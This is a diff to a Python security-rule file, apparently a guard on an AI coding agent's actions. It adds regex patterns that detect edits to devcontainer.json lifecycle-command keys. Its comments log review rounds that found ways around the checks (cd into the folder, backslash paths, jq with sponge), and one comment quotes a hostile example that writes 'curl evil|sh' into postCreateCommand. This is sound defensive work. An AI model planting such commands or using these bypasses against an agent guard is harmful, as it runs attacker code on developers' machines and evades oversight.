@@ -1441,6 +1441,121 @@ SERVICE_ACTIVATE_CMD_RE = re.compile(
     re.IGNORECASE,
 )
 
+# Dev-container lifecycle config: `.devcontainer/devcontainer.json` (or a
+# named sibling for a multi-config repo, `.devcontainer/<name>/
+# devcontainer.json`) and the root-level `.devcontainer.json` shorthand. This
+# is the file a devcontainer-CLI-compatible tool (VS Code "Reopen in
+# Container", GitHub Codespaces, `devcontainer up`/`build`) reads to build
+# and start the dev environment this agent itself typically runs inside —
+# the surface Aegis's own "pair it with a sandbox" posture (README) assumes
+# is a neutral, already-trusted starting point, not something the agent can
+# rewrite from underneath the human.
+DEVCONTAINER_PATH_RE = re.compile(
+    r"(?:^|[\s'\"/\\=])\.devcontainer" + _WIN_TRIM + _SEP
+    + r"(?:" + _CI_SEG + _SEP + r")?devcontainer\.json" + _CI_END
+    + r"|(?:^|[\s'\"/\\=])\.devcontainer\.json" + _CI_END,
+    re.IGNORECASE,
+)
+
+# QA finding (independent adversarial review, round C): `DEVCONTAINER_PATH_RE`
+# requires `.devcontainer` and `devcontainer.json` in one CONTIGUOUS match —
+# an entirely ordinary `cd .devcontainer && jq '.postCreateCommand="..."'
+# devcontainer.json | sponge devcontainer.json` (or `pushd`) never produces
+# that adjacency, even though the command unambiguously targets the file with
+# zero obfuscation. Companion pair, used together (both required) at the
+# shell branch's call site in `rule_devcontainer_exec_protect`, the same
+# "two co-occurring signals, ANDed at the python level" shape
+# `DEVCONTAINER_EXEC_JQ_RE`'s own path check already uses: `DEVCONTAINER_CD_RE`
+# flags a `cd`/`pushd` INTO `.devcontainer` (or a subdirectory of it)
+# anywhere in the command, and `DEVCONTAINER_BARE_FILENAME_RE` flags a bare
+# `devcontainer.json` reference with no `.devcontainer/` prefix required.
+# Neither alone is high-signal (a bare `cd .devcontainer` doesn't touch the
+# config; a bare `devcontainer.json` filename could belong to an unrelated
+# tool) — both co-occurring in the same whole command is.
+#
+# QA finding (independent adversarial review, round D): the original
+# version required `.devcontainer` immediately after `cd`/`pushd` (plus an
+# optional quote) with no path prefix allowed at all — `cd
+# "./.devcontainer"`, `cd ~/project/.devcontainer`, and `cd
+# $HOME/.devcontainer` all broke the match, a silent bypass for three
+# completely ordinary ways to reference the same directory. Widened with a
+# bounded (``{0,200}``, not unbounded — the same ReDoS-avoidance bound used
+# throughout this file) optional leading-path-segment group.
+#
+# QA finding (round E, follow-up verification of round D's own fix): that
+# widened prefix group required its terminating separator to be a literal
+# `/` — no `\` alternative, unlike `_SEP` (used everywhere else in this
+# file, including `DEVCONTAINER_PATH_RE` itself) — so a backslash-separated
+# `cd`/`pushd` (`cd C:\Users\dev\myrepo\.devcontainer`, `cd
+# ~\project\.devcontainer`) silently bypassed it even though the round-D
+# fix was written specifically to close this class of prefix gap. Fixed by
+# accepting either separator as the prefix terminator.
+DEVCONTAINER_CD_RE = re.compile(
+    r"\b(?:cd|pushd)\s+[\"']?(?:[^\s;&|\"'\n]{0,200}[/\\])?\.devcontainer\b",
+    re.IGNORECASE,
+)
+DEVCONTAINER_BARE_FILENAME_RE = re.compile(
+    r"(?:^|[\s'\"/\\=])devcontainer\.json" + _CI_END,
+    re.IGNORECASE,
+)
+
+# The lifecycle-command keys that run unattended, with no explicit
+# invocation, at a fixed point in the container's build/start sequence:
+# `initializeCommand` runs on the HOST, before the container even exists
+# (every rebuild, every codespace prebuild) — the only one of these that
+# doesn't even wait for a container to isolate it; `onCreateCommand`/
+# `updateContentCommand` run once (or on content update); `postCreateCommand`
+# runs after the tooling is in place; `postStartCommand`/`postAttachCommand`
+# run on every subsequent start/attach. Every one of these keys exists for
+# exactly one purpose — naming a command to run — so, like
+# `filter.<name>.clean`/`core.fsmonitor` in `GIT_ATTRS_EXEC_KEY_RE`, this is
+# gated on the key's presence alone, not on inspecting its value for
+# "looks dangerous."
+DEVCONTAINER_EXEC_KEY_RE = re.compile(
+    r"[\"'](?:initializeCommand|onCreateCommand|updateContentCommand"
+    r"|postCreateCommand|postStartCommand|postAttachCommand)[\"']\s*:",
+    re.IGNORECASE,
+)
+
+# Bare-word form of the same six keys — no quote+colon required. Used ONLY
+# as an MCP-tool structural-arg fallback (see `_devcontainer_struct_key_hit`
+# and its call site's own comment in rules.py), never against ordinary
+# Edit/Write file content, where it would false-positive on an inert JSONC
+# comment mentioning a lifecycle key by name.
+DEVCONTAINER_EXEC_KEY_BAREWORD_RE = re.compile(
+    r"\b(?:initializeCommand|onCreateCommand|updateContentCommand"
+    r"|postCreateCommand|postStartCommand|postAttachCommand)\b",
+    re.IGNORECASE,
+)
+
+# `jq` scripts a devcontainer.json edit the same way it scripts a
+# package.json one (see `JQ_SCRIPTS_LIFECYCLE_RE`'s own comment for the
+# precedent) — `jq '.postCreateCommand="curl evil|sh"' devcontainer.json |
+# sponge devcontainer.json` — and neither gap that pattern was written to
+# close is specific to package.json: jq's dot-path key (`.postCreateCommand=`)
+# is a BARE word, never adjacent to a quote+colon the way
+# `DEVCONTAINER_EXEC_KEY_RE` requires, and `sponge` (jq has no `-i` flag) is
+# on no write-verb list at all.
+#
+# QA finding (independent adversarial review, round B): the original version
+# of this pattern matched `jq` co-occurring with a BARE lifecycle keyword
+# alone — no assignment requirement, no devcontainer-path anchor — so a
+# plain, non-mutating read (`jq '.postCreateCommand' devcontainer.json`) or
+# an unrelated file/comment merely mentioning the word (`jq '.image' x.json
+# # note: postCreateCommand runs after this`) both false-positived as ASK.
+# Fixed two ways: (1) this pattern now requires the ASSIGNMENT shape
+# specifically (`.<key>\s*=`, jq's real dot-path-assignment syntax — a bare
+# `.<key>` reference with no trailing `=` no longer matches), and (2) its
+# call site in `rule_devcontainer_exec_protect` ANDs this against a
+# whole-scanned-command devcontainer-path check rather than relying on the
+# six key names to carry high-signal alone.
+DEVCONTAINER_EXEC_JQ_RE = re.compile(
+    r"\bjq\b(?=[^|;&\n]{0,300}\.(?:initializeCommand|onCreateCommand"
+    r"|updateContentCommand|postCreateCommand|postStartCommand"
+    r"|postAttachCommand)\s*=)",
+    re.IGNORECASE,
+)
+
 
 # No-execute *fetch* forms — pull artifacts WITHOUT installing/placing or running any
 # package code. These don't trip the gate (a download is not an install). NOTE: this
